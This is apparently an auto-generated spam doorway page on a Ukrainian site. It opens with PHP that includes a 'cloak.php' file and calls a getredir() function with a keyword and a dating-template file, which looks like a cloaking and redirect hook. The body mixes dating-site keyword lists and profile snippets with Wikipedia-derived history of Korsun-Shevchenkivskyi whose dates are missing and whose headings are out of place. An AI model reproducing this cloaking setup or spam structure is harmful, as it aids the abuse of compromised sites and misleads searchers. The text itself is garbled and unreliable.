<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d1%96%d1%81%d1%82%d0%be+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b2+%d0%9a%d0%be%d1%80%d1%81%d1%83%d0%bd%d1%8c-%d0%a8%d0%b5%d0%b2%d1%87%d0%b5%d0%bd%d0%ba%d1%96%d0%b2%d1%81%d1%8c%d0%ba%d0%b8%d0%b9+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Подорож до міста Росичів: що подивитись у Корсунь-Шевченківському?</title>
	<meta name="description" content="Сайт знайомств міста Корсунь-Шевченківський ❤❤️ - безкоштовні онлайн знайомства з дівчатами і чоловіками, знайомство в інтернеті." />
	<link rel="canonical" href="https://masage.od.ua/img" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/zawij-povniy-gachok-stebnik.php">повний гачок Стебник Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/406/kuv-prosto-pdklyucht.php">просто підключіть Чортків Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/go-dodatok-azatskih-znayomstv.php">додаток азіатських знайомств в Ялта Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/loru-zona-znayomstv-v.php">зона знайомств в Ізмаїл Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/313/xipuj-znayomstva-lesbyanki.php">знайомства лесбіянки поблизу Снігурівка Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Місто знайомства в Корсунь-Шевченківський Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<img src="https://mistaua.com/filesup/city_map/625uk.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Alex 45 років. Evgen 61 рік. Svitlana 48 років. Pavlo 47 років.</p>
		
			<br><ul>
			
				<li>.</li>
			
				<li>понад 40 швидкісних побачень поблизу Дніпро Україна.</li>
			
				<li>знайомства з християнином в Новоукраїнка Україна.</li>
			
				<li>рішення для знайомств Камянка Україна.</li>
			
				<li>знайомства з людьми похилого віку в Чугуїв Україна.</li>
			
				<li>сайти знайомств поблизу Городище Україна.</li>
			
			</ul>
		
	<p>Оленка 35 років. Vsevolod 49 років. Вікторія 37 років. Svitlana 45 років. Олексій 45 років. Орест 49 років. Сергій 52 роки. Галина 31 рік. Володимир 59 років. Максим 58 років. Хочу сюди!</p>
		
			<br><ul>
			
				<li>найкращі додатки для знайомств місто поруч Нікополь Україна.</li>
			
				<li>служба знайомств в Кремінна Україна.</li>
			
				<li>?</li>
			
				<li>політика знайомств Долинська Україна.</li>
			
				<li>служба сватання Оріхів Україна.</li>
			
				<li>міські сайти знайомств Хмільник Україна.</li>
			
			</ul>
		
	<p>Створити Анкету. VIP Анкета. Подобаються жінки, які мають чарівну усмішку. Шлюбне оголошення. Забезпечений, проживаю один, більше двадцяти років в Канаді. Нові Анкети сайту. Щоб попасти сюди , завантажте своє фото.</p>
		
			<br><ol>
			
				<li>сайти підключення в Хуст Україна.</li>
			
				<li>❤ ЗНАЙОМСТВА Корсунь-Шевченківський ❤ - ?</li>
			
				<li>Знайомства Корсунь-Шевченківський. Безкоштовний сайт знайомств онлайн в Корсуні!</li>
			
				<li>Знайомства в Корсуні для сексу?</li>
			
				<li>сватання мільйонера Золоте Україна.</li>
			
				<li>Любов, стосунки та знайомства.</li>
			
			</ul>
		
	<p>Ирина, 32 роки Только во время личной встречи мы сможем понять и узнать человека. Могу только сказать, что я ищу серьезного Олег, 58 років Вітаю гарних Панянок на сайті Прийшов сюди, щоб зустріти свою єдину жінку, на наше щасливе сімейне життя Замовити Шлюбне Оголошення.</p><a id='f1'></a><h3>Главное меню</h3><p>Проживаю один у власному особняку, Дочка замужем в Києві, син проживає в США, навідую дітей, люблю подорожувати, займаюся власним бізнесом, вдівець, люблю тварин, люблю відпочивати на природі, веду здоровий спосіб життя. Хотів би на цьому сайті Основні правила щодо заповнення анкет на Dvi Zirky. А чи знаєте Ви, що переважна частина користувачів Dvi Zirky - це чоловіки. У х за наказом гетьмана Богдана Хмельницького тут збудовано Корсунський замок.</p><strong><a id='f2'></a><h2>Історичні та культурні об’єкти</h2></strong><p>Корсунський замок за ілюстрацією був у формі квадрата з 4-ма вежами по кутах, оточений ровом, валом та дубовим палісадом, до замку вів розвідний міст, у кінці мосту була брама зі стрільницями та з приміщеннями для козаків. Над Брамою було літнє житлове помешкання. Брама була наново зведена в  р.</p>
<p>Всередині замку стояв будинок, у якому проживав губернатор, стайня, возівня, будинок для козаків, пекарня, кухня тощо. Посередині була дворівнева вежа з бійницями, у якій мешкали козаки. Біля неї знаходилася, частково зруйнована студня. У —  рр. Сам Корсунь було повністю спалено. Корсунщина була одним із центрів визвольної боротьби на Правобережжі , у тому числі гайдамацького руху, який постійно наростав починаючи з часу розформування Корсунського полку у  р.</p>
<p>На цій території весь час діяло декілька гайдамацьких загонів. Гайдамаки нападали на шляхетські маєтки, розорюючи їх. Декілька разів вони захоплювали Корсунь. Апогеєм гайдамацького руху було повстання  р.</p><a id='f3'></a><h3>Навігаційне меню</h3><p>Під час нього було вирізано всіх поляків та євреїв , зруйновано костьоли. Але в результаті військової підтримки Російської імперії цей виступ було придушено. Протягом декількох років відбувалися локальні виступи гайдамаків, але полякам урешті-решт вдалося встановити свій контроль над краєм і через декілька років рух гайдамаків тут повністю згас. Корсунщину знову було перетворено на безлюдну пустку. За люстрацією року в Корсуні був будинок. Корсунський замок був перетворений на в'язницю, де тримали прихильників православної віри.</p>
<p>З  р. Корсунь став власністю князя Станіслава Понятовського  — племінника останнього польського короля. Місто наново закладене , має 25 мурованих будинків. Станіслав Понятовський збудував тут фабрики сукна, замші, селітри, плантації шовковиці, винниці, розводив расових коней.</p>
<p>Заклав тут для молоді школу танців. У всьому йому спочатку допомагав французький художник і архітектор Жан Анрі Мюнц. Збудував тут шпиталь на три покої. Започаткував «касу допомоги» для погорільців.</p>
		
			
				<div>Безчинство в Корсуні. \</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/ufTQts6lBYI' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Однак добудовував палац вже шотландський архітектор на польській службі Ян Дісіор Ліндсей. За люстрацією року на одному з островів, який називали «Острів», стояв двоповерховий мурований палац, що мав 26 покоїв, 3 муровані будинки, 2 стайні. Зала була висотою в два поверхи, 15 на 10 метрів. Стайні для коней мали по 50 метрів довжини. Другий острів називався «Деніс» на ньому був закладений парк з оранжереями та теплицями. Крім того, було ще 5 менших островів без назви. В палаці містилася велика колекція археологічних знахідок, викопаних в околицях Корсуня, у тому числі золотих виробів.</p>
<p>Всього в місті нараховувалось будинків, з них 23 шляхетські, 34 єврейські, 25 мурованих. В центрі міста — ринкова площа у формі квадрата, по трьох сторонах були муровані будинки, а з четвертої «замок» — будинок губернатора, оточений глибоким ровом. Воно входило до Богуславського повіту Київського намісництва з  р. Корсуньський маєток купив у Понятовського за тисяч карбованців сріблом російський імператор Павло І. Він у році подарував його міністру юстиції генерал-прокурору Росії князю П.</p>
<p>Лопухіну, який знову закріпачив селян. Місцеві міщани і селяни були незадоволені новим становищем і борючись проти закріпачення протягом п'яти років доводили свої вольності, посилали скарги до Петербурга. В році сюди прибула спеціальна урядова комісія із каральним загоном і привела корсунців до покори. Організаторів виступів К. Тетянченка і Г. Калюжного було заслано на вічне поселення до Сибіру , 29 чоловік кинуто до богуславської в'язниці, решту покарано канчуками і різками.</p>
<p>В році князь Лопухін збудував у Корсуні суконну фабрику. Тоді серед них поширилися чутки, що той, хто запишеться до ополчення для участі в Кримській війні, буде звільнений від кріпацтва. У Корсуні селяни зібрали натовп понад 4 тисяч із мешканців Корсуня, Ситників, Моринців, Виграєва , Киченців, Корнилівки, Гарбузини, Бровахи і зажадали від князя дати їм грамоту на звільнення. Сталася сутичка з поліцією, у результаті якої було вбито 13, поранено 27 селян.</p><strong><a id='f4'></a><h2>Корсунь-Шевченківський — Вікіпедія</h2></strong><p>Після цього всіх учасників виступу було покарано: 60 чоловік віддали військово-польовому суду, решту покарали шомполами й різками. У Корсуні неодноразово бував український поет, художник та мислитель Тарас Шевченко , зокрема, з 28 червня по 8 липня року тут він гостював у свого троюрідного брата і свояка Варфоломія Григоровича Шевченка, який працював помічником управителя князя. Шевченко записував народні пісні, багато малював. Він дуже любив прогулюватися Корсунським парком, замальовуючи його прекрасні куточки. Збереглися малюнки, зроблені ним у Корсуні, які були вміщені до Корсунського Суліївського альбому.</p>
<p>Це «В Корсуні», «Дуб», «Дерева» та інші.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/335/rulos-chorn-lesbyanki.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/335/ne-bezkoshtovne-msto-znayomstv.php">безкоштовне місто знайомств в Інтернеті - Христинівка Україна</a></li><li><a href="https://masage.od.ua/img/377/coh-sayti-znayomstv-dlya.php">сайти знайомств для міста Павлоград Україна</a></li><li><a href="https://masage.od.ua/img/247/cyhip-nternet-znayomstva-v.php">Інтернет знайомства в Ватутіне Україна</a></li><li><a href="https://masage.od.ua/img/106/fobel-derzhavne-shvidksne-znayomstvo.php">державне швидкісне знайомство поблизу Стрий Україна</a></li><li><a href="https://masage.od.ua/img/313/jiti-znayomstva-z-hloptsyami.php">знайомства з хлопцями з Росії Южне Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#f1'>Главное меню</a></li>
<li><a href='#f2'>Історичні та культурні об’єкти</a></li>
<li><a href='#f3'>Навігаційне меню</a></li>
<li><a href='#f4'>Корсунь-Шевченківський — Вікіпедія</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/398/syq-naykrash-shvidksn-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>